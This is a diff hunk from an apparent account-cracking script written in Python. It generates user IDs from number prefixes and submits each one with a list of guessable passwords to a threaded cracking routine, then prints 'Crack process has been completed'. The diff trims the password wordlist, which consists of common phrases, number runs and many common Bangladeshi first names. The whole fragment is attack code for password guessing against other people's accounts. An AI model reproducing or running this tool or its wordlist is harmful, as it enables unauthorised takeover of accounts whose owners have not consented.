@@ -154,7 +154,7 @@ def fuck():
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'i love you','iloveyou','free fire','freefire','Free Fire','FreeFire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','Jannat','nusrat','Nusrat','sadia123','sadiya','Sadiya','sumaiya','Sumaiya','fariya','Fariya','jannatul','Jannatul','Mimmim','mimmim','017017','farjana','brishti','brishty','nabila','valobasi','habiba','fatema','Fatema','sultana','Sultana','Sharmin','sharmin','soniya','Soniya','Farjana','farjana','habiba','Habiba','samiya','Samiya','tamanna','Tamanna','nadiya','nafiza','Nadiya','Nafiza','Salman','salman','rakibul','Rakibul','Nayeem','nayeem','shohug','Shohug','rashel','Rashel','mafuza','Mafuza']
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'i love you','iloveyou','free fire','freefire','Free Fire','FreeFire','102030','203040','304050','405060','506070','607080','708090','8090100','135790']
             yaari.submit(DEVHIS2,uid,pwx,tl)
     print('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(' ┏━[•] Crack process has been completed')
